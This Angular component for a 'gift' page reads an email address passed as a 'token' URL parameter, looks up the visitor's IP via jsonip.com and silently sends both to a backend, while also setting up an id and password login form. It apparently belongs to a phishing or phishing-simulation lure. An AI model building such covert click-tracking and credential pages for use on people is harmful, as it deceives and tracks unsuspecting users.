import { HttpClient } from '@angular/common/http';
import { Component, ElementRef, OnInit, ViewChild } from '@angular/core';
import { FormBuilder, FormGroup, Validators } from '@angular/forms';
import { ActivatedRoute } from '@angular/router';
import { MainService } from '../service/main.service';
@Component({
  selector: 'app-gift',
  templateUrl: './gift.component.html',
  styleUrls: ['./gift.component.css']
})
export class GiftComponent implements OnInit {
  email:any;
  ipAddress: any;
  id:any;
  loginForm:FormGroup;


  constructor(private route:ActivatedRoute,private http:HttpClient,private _mainService:MainService,private formBuilder: FormBuilder) 
  {
    this.loginForm = this.formBuilder.group({});
   }

  ngOnInit(): void {
    this.loginForm = this.formBuilder.group({
      id:['',Validators.required],
      password:['',Validators.required],
    });
    this.route.queryParams.subscribe(
      params => {
        this.email =  params['token'];
        this.id =  params['vals'];
      }
    )
    console.log('token',this.email);
    console.log('id',this.id);
    this.http.get<{ip:string}>('https://jsonip.com')
    .subscribe( data => {
      this.ipAddress = data.ip
      this.sendData(this.email,this.ipAddress,this.id);
    })

  }

  sendData(emailID:any,ip:any,id:any){
    let obj={
      'token':emailID,
      'ip':ip,
      'vals':id
    }
    this._mainService.sendUserDetails(obj).subscribe((data:any)=>{
      if(data){
        console.log('data sent');
      }
    })
  }

}
